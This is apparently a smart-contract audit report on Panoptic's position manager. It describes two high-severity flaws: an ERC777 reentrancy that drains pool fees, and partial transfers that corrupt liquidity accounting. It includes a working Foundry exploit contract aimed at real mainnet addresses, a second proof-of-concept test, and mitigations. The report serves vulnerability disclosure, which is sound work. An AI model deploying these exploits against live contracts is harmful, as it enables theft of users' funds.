[H-01] Attacker can steal all fees from SFPM in pools with ERC777 tokens
Submitted bymonrel, also found byhash,linmiaomiao, andbin2chen
An attacker can steal all outstanding fees belonging to the SFPM in a uniswap pool if a token in the pool is an ERC777.
Proof of Concept
The attack is possible due to the following sequence of events when minting a short option withminTokenizedPosition():
ERC1155 is minted.L521
_mint(msg.sender,tokenId,positionSize);
Liquidity is updated.L1004
s_accountLiquidity[positionKey] =uint256(0).toLeftSlot(removedLiquidity).toRightSlot(
An LP position is minted and tokens are transferred frommsg.senderto uniswap.L1031
_moved=isLong==0?_mintLiquidity(_liquidityChunk,_univ3pool):_burnLiquidity(_liquidityChunk,_univ3pool);
feesBaseis updated.L1062
s_accountFeesBase[positionKey] =_getFeesBase(_univ3pool,updatedLiquidity,_liquidityChunk);
If at least one of the tokens transferred at step 3 is an ERC777msg.sendercan implement atokensToSender()hook and transfer the ERC1155 befores_accountFeesBase[positionKey]has been updated.registerTokenTransfer()will copys_accountLiquidity[positionKey]>0ands_accountFeesBase[positionKey] = 0such that the receiver now has a ERC1155 position with non-zero liquidity but afeesBase = 0.
When this position is burned the fees collected are calculated based on:L1209
int256amountToCollect=_getFeesBase(univ3pool,startingLiquidity,liquidityChunk).sub(s_accountFeesBase[positionKey]
The attacker will withdraw fees based on the current value offeeGrowthInside0LastX128andfeeGrowthInside1LastX128and not the difference between the current values and when the short position was created.
The attacker can chose the tick range such thatfeeGrowthInside1LastX128andfeeGrowthInside1LastX128are as large as possible to minimize the liquidity needed steal all available fees.
TheAttackImpcontract below implements thetokensToSend()hook and transfer the ERC1155 beforefeesBasehas been set.  An addressAttackerdeploysAttackImpand callsAttackImp#minAndTransfer()to start the attack. To finalize the attack they burn the position and steal all available fees that belong to the SFPM.
In the POC we use the VRA pool as an example of a uniswap pool with a ERC777 token.
Create a test file in2023-11-panoptic/test/foundry/core/Attacker.t.soland paste the below code. Runforge test --match-test testAttack --fork-url "https://eth.public-rpc.com" --fork-block-number 18755776 -vvvto execute the POC.
// SPDX-License-Identifier: UNLICENSEDpragmasolidity^0.8.0;import"forge-std/Test.sol";import{stdMath}from"forge-std/StdMath.sol";import{Errors}from"@libraries/Errors.sol";import{Math}from"@libraries/Math.sol";import{PanopticMath}from"@libraries/PanopticMath.sol";import{CallbackLib}from"@libraries/CallbackLib.sol";import{TokenId}from"@types/TokenId.sol";import{LeftRight}from"@types/LeftRight.sol";import{IERC20Partial}from"@testUtils/IERC20Partial.sol";import{TickMath}from"v3-core/libraries/TickMath.sol";import{FullMath}from"v3-core/libraries/FullMath.sol";import{FixedPoint128}from"v3-core/libraries/FixedPoint128.sol";import{IUniswapV3Pool}from"v3-core/interfaces/IUniswapV3Pool.sol";import{IUniswapV3Factory}from"v3-core/interfaces/IUniswapV3Factory.sol";import{LiquidityAmounts}from"v3-periphery/libraries/LiquidityAmounts.sol";import{SqrtPriceMath}from"v3-core/libraries/SqrtPriceMath.sol";import{PoolAddress}from"v3-periphery/libraries/PoolAddress.sol";import{PositionKey}from"v3-periphery/libraries/PositionKey.sol";import{ISwapRouter}from"v3-periphery/interfaces/ISwapRouter.sol";import{SemiFungiblePositionManager}from"@contracts/SemiFungiblePositionManager.sol";import{IERC20}from"@openzeppelin/contracts/token/ERC20/IERC20.sol";import{PositionUtils}from"../testUtils/PositionUtils.sol";import{UniPoolPriceMock}from"../testUtils/PriceMocks.sol";import{ReenterMint,ReenterBurn}from"../testUtils/ReentrancyMocks.sol";import{ERC1820Implementer}from"openzeppelin-contracts/contracts/utils/introspection/ERC1820Implementer.sol";import{IERC1820Registry}from"openzeppelin-contracts/contracts/utils/introspection/IERC1820Registry.sol";import{ERC1155Receiver}from"openzeppelin-contracts/contracts/token/ERC1155/utils/ERC1155Receiver.sol";import"forge-std/console2.sol";contractSemiFungiblePositionManagerHarnessisSemiFungiblePositionManager{constructor(IUniswapV3Factory_factory)SemiFungiblePositionManager(_factory) {}functionpoolContext(uint64poolId)publicviewreturns(PoolAddressAndLockmemory) {returns_poolContext[poolId];}functionaddrToPoolId(addresspool)publicviewreturns(uint256) {returns_AddrToPoolIdData[pool];}}contractAttackImpisERC1820Implementer{bytes32constantprivateTOKENS_SENDER_INTERFACE_HASH=0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;IERC1820Registry_ERC1820_REGISTRY=IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);SemiFungiblePositionManagerHarnesssfpm;ISwapRouterrouter=ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);addresstoken0;addresstoken1;uint256tokenId;uint128positionSize;addressowner;constructor(address_token0,address_token1,address_sfpm) {owner=msg.sender;sfpm=SemiFungiblePositionManagerHarness(_sfpm);token0=_token0;token1=_token1;IERC20Partial(token0).approve(address(sfpm),type(uint256).max);IERC20Partial(token1).approve(address(sfpm),type(uint256).max);IERC20Partial(token0).approve(address(router),type(uint256).max);IERC20Partial(token1).approve(address(router),type(uint256).max);_registerInterfaceForAddress(TOKENS_SENDER_INTERFACE_HASH,address(this));IERC1820Registry(_ERC1820_REGISTRY).setInterfaceImplementer(address(this),TOKENS_SENDER_INTERFACE_HASH,address(this));}functiononERC1155Received(address_operator,address_from,uint256_id,uint256_value,bytescalldata_data)externalreturns(bytes4){returnbytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));}functionmintAndTransfer(uint256_tokenId,uint128_positionSize,int24slippageTickLimitLow,int24slippageTickLimitHigh)public{tokenId=_tokenId;positionSize=_positionSize;sfpm.mintTokenizedPosition(tokenId,positionSize,slippageTickLimitLow,slippageTickLimitHigh);}functiontokensToSend(addressoperator,addressfrom,addressto,uint256amount,bytescalldatauserData,bytescalldataoperatorData)external{sfpm.safeTransferFrom(address(this),owner,tokenId,positionSize,bytes(""));}}contractstealFeesisTest{usingTokenIdforuint256;usingLeftRightforint256;usingLeftRightforuint256;addressVRA=0xF411903cbC70a74d22900a5DE66A2dda66507255;addressWETH=0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;IUniswapV3PoolPOOL=IUniswapV3Pool(0x98409d8CA9629FBE01Ab1b914EbF304175e384C8);IUniswapV3FactoryV3FACTORY=IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);ISwapRouterrouter=ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);SemiFungiblePositionManagerHarnesssfpm;IUniswapV3Poolpool;uint64poolId;addresstoken0;addresstoken1;uint24fee;int24tickSpacing;uint256isWETH;int24currentTick;uint160currentSqrtPriceX96;uint256feeGrowthGlobal0X128;uint256feeGrowthGlobal1X128;addressAttacker=address(0x12356838383);addressMerlin=address(0x12349931);addressSwapper=address(0x019399312349931);//Width and strike is set such that at least one tick is already initializedint24width=60;int24strike=125160+60;uint256tokenId;AttackImpImplementer;int24tickLower;int24tickUpper;uint128positionSize;uint128positionSizeBurn;functionsetUp()public{sfpm=newSemiFungiblePositionManagerHarness(V3FACTORY);}function_initPool(uint256seed)internal{_cacheWorldState(POOL);sfpm.initializeAMMPool(token0,token1,fee);}function_cacheWorldState(IUniswapV3Pool_pool)internal{pool=_pool;poolId=PanopticMath.getPoolId(address(_pool));token0=_pool.token0();token1=_pool.token1();isWETH=token0==address(WETH) ?0:1;fee=_pool.fee();tickSpacing=_pool.tickSpacing();(currentSqrtPriceX96,currentTick, , , , , ) =_pool.slot0();feeGrowthGlobal0X128=_pool.feeGrowthGlobal0X128();feeGrowthGlobal1X128=_pool.feeGrowthGlobal1X128();}functionaddUniv3pool(uint256self,uint64_poolId)internalpurereturns(uint256) {unchecked{returnself+uint256(_poolId);}}functiongenerateFees(uint256run)internal{for(uint256x;x<run;x++) {}}functiontestAttack()public{_initPool(1);positionSize=1e18;tokenId=uint256(0).addUniv3pool(poolId).addLeg(0,1,isWETH,0,0,0,strike,width);(tickLower,tickUpper) =tokenId.asTicks(0,tickSpacing);//------------ Honest user mints short position ------------------------------vm.startPrank(Merlin);deal(token0,Merlin,type(uint128).max);deal(token1,Merlin,type(uint128).max);IERC20Partial(token0).approve(address(sfpm),type(uint256).max);IERC20Partial(token1).approve(address(sfpm),type(uint256).max);IERC20Partial(token0).approve(address(router),type(uint256).max);IERC20Partial(token1).approve(address(router),type(uint256).max);(int256totalCollected,int256totalSwapped,int24newTick) =sfpm.mintTokenizedPosition(tokenId,uint128(positionSize),TickMath.MIN_TICK,TickMath.MAX_TICK);(uint128premBeforeSwap0,uint128premBeforeSwap1) =sfpm.getAccountPremium(address(pool),Merlin,0,tickLower,tickUpper,currentTick,0);uint256accountLiqM=sfpm.getAccountLiquidity(address(POOL),Merlin,0,tickLower,tickUpper);console2.log("Premium in token0 belonging to Merlin before swaps:   ",Math.mulDiv64(premBeforeSwap0,accountLiqM.rightSlot()));console2.log("Premium in token1 belonging to Merlin before swaps:   ",Math.mulDiv64(premBeforeSwap1,accountLiqM.rightSlot()));//------------ Swap in pool to generate fees -----------------------------changePrank(Swapper);deal(token0,Swapper,type(uint128).max);deal(token1,Swapper,type(uint128).max);IERC20Partial(token0).approve(address(router),type(uint256).max);IERC20Partial(token1).approve(address(router),type(uint256).max);uint256swapSize=10e18;router.exactInputSingle(ISwapRouter.ExactInputSingleParams(isWETH==0?token0:token1,isWETH==1?token0:token1,fee,Swapper,block.timestamp,swapSize,0,0));router.exactOutputSingle(ISwapRouter.ExactOutputSingleParams(isWETH==1?token0:token1,isWETH==0?token0:token1,fee,Swapper,block.timestamp,swapSize- (swapSize*fee) /1_000_000,type(uint256).max,0));(,currentTick, , , , , ) =pool.slot0();// poke uniswap poolchangePrank(address(sfpm));pool.burn(tickLower,tickUpper,0);(uint128premAfterSwap0,uint128premAfterSwap1) =sfpm.getAccountPremium(address(pool),Merlin,0,tickLower,tickUpper,currentTick,0);console2.log("Premium in token0 belonging to Merlin after swaps:    ",Math.mulDiv64(premAfterSwap0,accountLiqM.rightSlot()));console2.log("Premium in token1 belonging to Merling after swaps:   ",Math.mulDiv64(premAfterSwap1,accountLiqM.rightSlot()));// -------------- Attack is performed  -------------------------------changePrank(Attacker);Implementer=newAttackImp(token0,token1,address(sfpm));deal(token0,address(Implementer),type(uint128).max);deal(token1,address(Implementer),type(uint128).max);Implementer.mintAndTransfer(tokenId,uint128(positionSize),TickMath.MIN_TICK,TickMath.MAX_TICK);uint256balance=sfpm.balanceOf(Attacker,tokenId);uint256balance2=sfpm.balanceOf(Merlin,tokenId);(uint128premTokenAttacker0,uint128premTokenAttacker1) =sfpm.getAccountPremium(address(pool),Merlin,0,tickLower,tickUpper,currentTick,0);(, , ,uint256tokensowed0,uint256tokensowed1) =pool.positions(PositionKey.compute(address(sfpm),tickLower,tickUpper));console2.log("Fees in token0 available to SFPM before attack:       ",tokensowed0);console2.log("Fees in token1 available to SFPM before attack:       ",tokensowed1);sfpm.burnTokenizedPosition(tokenId,uint128(positionSize),TickMath.MIN_TICK,TickMath.MAX_TICK);(, , ,tokensowed0,tokensowed1) =pool.positions(PositionKey.compute(address(sfpm),tickLower,tickUpper));console2.log("Fees in token0 available to SFPM after attack:        ",tokensowed0);console2.log("Fees in token1 available to SFPM after attack:        ",tokensowed1);{// Tokens used for attack, deposited through implementeruint256attackerDeposit0=type(uint128).max-IERC20(token0).balanceOf(address(Implementer));uint256attackerDeposit1=type(uint128).max-IERC20(token1).balanceOf(address(Implementer));uint256attackerProfit0=IERC20(token0).balanceOf(Attacker)-attackerDeposit0;uint256attackerProfit1=IERC20(token1).balanceOf(Attacker)-attackerDeposit1;console2.log("Attacker Profit in token0:                            ",attackerProfit0);console2.log("Attacker Profit in token1:                            ",attackerProfit1);assertGe(attackerProfit0+attackerProfit1,0);}}}
Tools Used
VScode, Foundry
Recommended Mitigation Steps
Update liquidity after minting/burning:
_moved=isLong==0?_mintLiquidity(_liquidityChunk,_univ3pool):_burnLiquidity(_liquidityChunk,_univ3pool);s_accountLiquidity[positionKey] =uint256(0).toLeftSlot(removedLiquidity).toRightSlot(updatedLiquidity);
For redundancy,registerTokensTransfer()can also use theReentrancyLock()modifier to always block reentrancy when minting and burning.
Assessed type
Reentrancy
dyedm1 (Panoptic) confirmed via duplicate issue #519

[H-02] Partial transfers are still possible, leading to incorrect storage updates, and the calculated account premiums will be significantly different from what they should be
Submitted byosmanozdemir1, also found by minhtrng (1,2), fnanni (1,2),0xloscar01,KupiaSec,ether_sky,hash,0xDING99YA, andSpicyMeatball
The positions in this protocol are ERC1155 tokens and they can be minted or burned.
Token transfers areextremely limitedin the protocol:
The sender must transfer all of its liquidity.The recipient must not have a position in that tick range and token type.
Users’ current liquidity in their positions is tracked with a storage variable calleds_accountLiquidity. This mappingis overwritten during transfers and the whole value is transferred. The reason for not allowing partial transfers is that partial transfers will mess up the whole storage updating mechanism.
The requirements mentioned above are checkedhere:
file:SemiFungiblePositionManager.sol// function registerTokenTransfer// ...// Revert if recipient already has that positionif((s_accountLiquidity[positionKey_to] !=0) ||(s_accountFeesBase[positionKey_to] !=0))revertErrors.TransferFailed();// Revert if not all balance is transferreduint256fromLiq=s_accountLiquidity[positionKey_from];-->if(fromLiq.rightSlot() !=liquidityChunk.liquidity())revertErrors.TransferFailed();//@audit if the right slot is equal to transferred liquidity, it will pass. There is no check related to left slot.// ... more code
The check related to whether all balance is transferred or not is made by checking the right slot of the sender’s liquidity usingfromLiq.rightSlot(). Right now, I want to point out there is no check related to the left slot. I’ll get there later.
Now, we have to understand how position keys are constructed, and how the left slot and right slot work. Let’s start with the positionkeys:
//construct the positionKey for the from and to addressesbytes32positionKey_from=keccak256(abi.encodePacked(address(univ3pool),from,id.tokenType(leg),liquidityChunk.tickLower(),liquidityChunk.tickUpper())
They are constructed with pool address, user address, token type, lower tick and upper tick. The most important thing I want to mention here is that whether the position islong or short is not in the position key. The thing that matters is thetoken type (put or call). Which means:
Short putandLong putorders have the same position key (for the same tick range) but different token IDs.
The second thing we need to know is theleft and right slot mechanism:
/*       removed liquidity r          net liquidity N=(T-R)* |<------- 128 bits ------->|<------- 128 bits ------->|* |<---------------------- 256 bits ------------------->|*/////// @dev mapping that stores the liquidity data of keccak256(abi.encodePacked(address poolAddress, address owner, int24 tickLower, int24 tickUpper))// liquidityData is a LeftRight. The right slot represents the liquidity currently sold (added) in the AMM owned by the user// the left slot represents the amount of liquidity currently bought (removed) that has been removed from the AMM - the user owes it to a seller// the reason why it is called "removedLiquidity" is because long options are created by removed liquidity -ie. short selling LP positions
The left slot holds the removed liquidity values and the right slot holds the net liquidity values.
These values are updated in the_createLegInAMMduring minting and burning depending on whether the action isshort or long or mint or burn etc.
As I mentioned above, only theright slotis checked during transfers. If a user mints a short put (deposits tokens), and then mints a long put (withdraws tokens) in the same ticks, the right slot will be a very small number but the user will have two different ERC1155 tokens(token Ids are different for short and long positions, but position key is the same). Then that user can transfer just the partial amount of short put tokens that correspond to the right slot.
I’ll provide two different scenarios here where the sender is malicious in one of them, and a naive user in another one. You can also find a coded PoC below that shows all of these scenarios.
Scenario 1: Alice(sender) is a malicious user
Alice mints 100Short puttokens.//NOTE: The liquidity is different than the token amounts but I'm sharing like this just to make easy/*|---left slot: removed liq---|---right slot: added liq---||           0                |            100            |Alice mints 90Long puttokens in the same ticks (not burn)./*|---left slot: removed liq---|---right slot: added liq---||           90               |             10            |At this moment Alice has 100 short put tokens and 90 long put tokens (tokenIds are different but theposition keyis the same).Alice transfers only 10 short put tokens to Bob. This transaction succeeds as the 10 short put token liquidity is the same as Alice’s right slot liquidity. (The net liquidity is totally transferred).After the transfer, Alice still has 90 short put tokens and 90 long put tokens but Alice’ss_accountLiquiditystorage variable is updated to 0.At this moment Bob only has 10 short put tokens. However, the storage is updated. Bob didn’t remove any tokens but hiss_accountLiquidityleft slot is 90, and it looks like Bob has removed 90 tokens./*|---left slot: removed liq---|---right slot: added liq---||           90               |             10            |
There are two big problems here:
Bob has no way to update hisremovedLiquidityvariable other than burning long put tokens. However, he doesn’t have these tokens. They are still in Alice’s wallet.All of Bob’s account premiums and owed premiums are calculated based on the ratio of removed, net and total liquidity. All of his account premiums for that option will be completely incorrect. Seehere.
Now imagine a malicious user minting a huge amount of short put (deposit), minting 99% of that amount of long put (withdraw), and transferring that 1% to the victim. It’s basically setting traps for the victim by transferring tiny amount ofnetliquidities. The victim’s account looks like he removed a lot of liquidity, and if the victim mints positions in the same range in the future, theowed premiumsfor this position will be extremely different, and much higher than it should be.
Scenario 2: Alice (sender) is a naive user
The initial steps are the same as those above. Alice is just a regular user.
Alice mints 100 short putThen mints 90 long put.Alice knows she has some liquidity left and transfers 10 short put tokens to her friend.Right now, Alice has 90 short put tokens and 90 long put tokens. Her account liquidity is overwritten and updated to 0, but she doesn’t know that. She is just a regular user. From her perspective, she still has these 90 short put and 90 long put tokens in her wallet.Alice wants to burn her tokens (she has to burn the long ones first).Alice burns 90 long put tokens.
SemiFungiblePositionManager.sol#L961C9-L980C18
```solidityunchecked {//...uint128 startingLiquidity = currentLiquidity.rightSlot();uint128 removedLiquidity = currentLiquidity.leftSlot();uint128 chunkLiquidity = _liquidityChunk.liquidity();if (isLong == 0) {// selling/short: so move from msg.sender *to* uniswap// we're minting more liquidity in uniswap: so add the incoming liquidity chunk to the existing liquidity chunkupdatedLiquidity = startingLiquidity + chunkLiquidity;/// @dev If the isLong flag is 0=short but the position was burnt, then this is closing a long position/// @dev so the amount of short liquidity should decrease.if (_isBurn) {979.-->            removedLiquidity -= chunkLiquidity; //@audit her removedLiquidity was 0, but this is inside the unchecked block. Now her removed liquidity is a huge number.```
Alice’s account liquidity storage was updated before (step 4) andremovedLiquiditywas 0. After burning her long put tokens, the newremovedLiquidity(L979 above) will be an enormous number since it is inside the unchecked block.
Right now, Alice looks like she removed an unbelievably huge amount of liquidity and she messed up her account (but she didn’t do anything wrong).
Impact
Partial transfers are still possible since the function only checks whether the net liquidity (right slot) is transferred.This will disrupt the whole storage updates related to account liquidities.Malicious users might transfer a tiny bit of their balance, and cause the recipient to pay much more premium.Naive users might unintentionally mess up their accounts.
Proof of Concept
Down below you can find a coded PoC that proves all scenarios explained above. You can use the protocol’s own setup to test this issue:
Copy and paste the snippet in theSemiFungiblePositionManager.t.solfile.Run it withforge test --match-test test_transferpartial -vvv.
functiontest_transferpartial()public{_initPool(1);int24width=10;int24strike=currentTick+100- (currentTick%10);// 10 is tick spacing. We subtract the remaining part, this way strike % tickspacing == 0.uint256positionSizeSeed=1ether;// Create state with the parameters above.populatePositionData(width,strike,positionSizeSeed);console2.log("pos size: ",positionSize);console2.log("current tick: ",currentTick);//--------------------------- MINT BOTH: A SHORT PUT AND A LONG PUT ---------------------------------------// MINTING SHORT PUT-----// Construct tokenId for short put.uint256tokenIdforShortPut=uint256(0).addUniv3pool(poolId).addLeg(0,1,isWETH,0,1,0,strike,width);// Mint a short put position with 100% positionSizesfpm.mintTokenizedPosition(tokenIdforShortPut,uint128(positionSize),TickMath.MIN_TICK,TickMath.MAX_TICK);// Alice's account liquidity after first mint will be like this --------------------> removed liq (left slot): 0 | added liq (right slot): liquidityuint256accountLiquidityAfterFirstMint=sfpm.getAccountLiquidity(address(pool),Alice,1,tickLower,tickUpper);assertEq(accountLiquidityAfterFirstMint.leftSlot(),0);assertEq(accountLiquidityAfterFirstMint.rightSlot(),expectedLiq);// MINTING LONG PUT----// Construct tokenId for long put -- Same strike same width same token typeuint256tokenIdforLongPut=uint256(0).addUniv3pool(poolId).addLeg(0,1,isWETH,1,// isLong true1,// token type is the same as above.0,strike,width);// This time mint but not with whole position size. Use 90% of it.sfpm.mintTokenizedPosition(tokenIdforLongPut,uint128(positionSize*9/10),TickMath.MIN_TICK,TickMath.MAX_TICK);// Account liquidity after the second mint will be like this: ------------------------  removed liq (left slot): 90% of the liquidity | added liq (right slot): 10% of the liquidityuint256accountLiquidityAfterSecondMint=sfpm.getAccountLiquidity(address(pool),Alice,1,tickLower,tickUpper);// removed liq 90%, added liq 10%// NOTE: there was 1 wei difference due to rounding. That's why ApproxEq is used.assertApproxEqAbs(accountLiquidityAfterSecondMint.leftSlot(),expectedLiq*9/10,1);assertApproxEqAbs(accountLiquidityAfterSecondMint.rightSlot(),expectedLiq*1/10,1);// Let's check ERC1155 token balances of Alice.// She sould have positionSize amount of short put token, and positionSize*9/10 amount of long put token.assertEq(sfpm.balanceOf(Alice,tokenIdforShortPut),positionSize);assertEq(sfpm.balanceOf(Alice,tokenIdforLongPut),positionSize*9/10);// -------------------------- TRANSFER ONLY 10% TO BOB -----------------------------------------------/* During the transfer only the right slot is checked.If the sender account's right slot liquidity is equal to transferred liquidity, transfer is succesfully made regardless of the left slot (as the whole net liquidity is transferred)*/// The right side of the Alice's position key is only 10% of liquidity. She can transfer 1/10 of the short put tokens.sfpm.safeTransferFrom(Alice,Bob,tokenIdforShortPut,positionSize*1/10,"");// After the transfer, Alice still has positionSize * 9/10 amount of short put tokens and long put tokens.// NOTE: There was 1 wei difference due to rounding. That's why used approxEq.assertApproxEqAbs(sfpm.balanceOf(Alice,tokenIdforShortPut),positionSize*9/10,1);assertApproxEqAbs(sfpm.balanceOf(Alice,tokenIdforLongPut),positionSize*9/10,1);// Bob has positionSize * 1/10 amount of short put tokens.assertApproxEqAbs(sfpm.balanceOf(Bob,tokenIdforShortPut),positionSize*1/10,1);// The more problematic thing is that tokens are still in the Alice's wallet but Alice's position key is updated to 0.// Bob only got a little tokens but his position key is updated too, and he looks like he removed a lot of liquidity.uint256Alice_accountLiquidityAfterTransfer=sfpm.getAccountLiquidity(address(pool),Alice,1,tickLower,tickUpper);uint256Bob_accountLiquidityAfterTransfer=sfpm.getAccountLiquidity(address(pool),Bob,1,tickLower,tickUpper);assertEq(Alice_accountLiquidityAfterTransfer.leftSlot(),0);assertEq(Alice_accountLiquidityAfterTransfer.rightSlot(),0);// Bob's account liquidity is the same as Alice's liq after second mint.// Bob's account looks like he removed tons of liquidity. It will be like this: ---------------------  removed liq (left slot): 90% of the liquidity | added liq (right slot): 10% of the liquidityassertEq(Bob_accountLiquidityAfterTransfer.leftSlot(),accountLiquidityAfterSecondMint.leftSlot());assertEq(Bob_accountLiquidityAfterTransfer.rightSlot(),accountLiquidityAfterSecondMint.rightSlot());console2.log("Bob's account removed liquidity after transfer: ",Bob_accountLiquidityAfterTransfer.leftSlot());// -----------------------------------SCENARIO 2-----------------------------------------------// ----------------------- ALICE NAIVELY BURNS LONG PUT TOKENS ---------------------------------// Alice still had 90 long put and short put tokens. She wants to burn.sfpm.burnTokenizedPosition(tokenIdforLongPut,uint128(positionSize*9/10),TickMath.MIN_TICK,TickMath.MAX_TICK);uint256Alice_accountLiquidityAfterBurn=sfpm.getAccountLiquidity(address(pool),Alice,1,tickLower,tickUpper);// Her account liquidity left side is enormously big at the moment due to unchecked subtraction in line 979.console2.log("Alice's account liquidity left side after burn: ",Alice_accountLiquidityAfterBurn.leftSlot());}
The result after running the test:
Running1testfortest/foundry/core/SemiFungiblePositionManager.t.sol:SemiFungiblePositionManagerTest[PASS]test_transferpartial() (gas:1953904)Logs:Bound Result 1Bound Result 1000000000000000000pos size:  1009241985705208217current tick:  199478Bob's account removed liquidity after transfer:  8431372059003199Alice's account liquidity left side after burn:  340282366920938463463366176059709208257Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.55sRan 1 test suite: 1 test passed, 0 failed, 0 skipped (1totaltest)
Tools Used
Foundry
Recommended Mitigation Steps
At the moment, the protocol checks if the wholenet liquidityis transferred by checking the right slot. However, this restriction is not enough and the situation of the left slot is not checked at all.
The transfer restriction should be widened and users should not be able to transfer if their removed liquidity (left slot) is greater than zero.
Assessed type
Token-Transfer
dyedm1 (Panoptic) confirmed

